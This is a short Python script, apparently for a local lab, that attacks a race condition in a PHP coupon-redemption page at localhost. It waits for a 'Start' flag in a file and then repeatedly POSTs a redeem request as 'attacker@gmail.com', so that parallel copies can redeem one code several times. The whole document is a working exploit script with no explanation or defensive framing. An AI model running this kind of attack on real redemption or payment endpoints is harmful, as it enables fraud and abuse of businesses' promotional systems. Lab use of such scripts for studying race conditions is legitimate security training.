import requests
import random

 

# Define the URL you want to send the POST request to
url = "http://localhost/sites/race_condition/race_condition_sp/redeem_code.php"

# Define the data you want to send in the POST body
data = {"email": "attacker@gmail.com","code": "ABC-XYZ","submit":"submit"}


#prevent start the attack until instructed
while True:
    f = open("start_point.txt", "r")
    x = (f.readline())
    f.close()
    if (x == 'Start'):
        break 

#start the attack
while True:
    # Send the POST request and get the response
    response = requests.post(url, data=data)

    # Check the response status code
    if response.status_code == 200:
        print(response.text)
        break
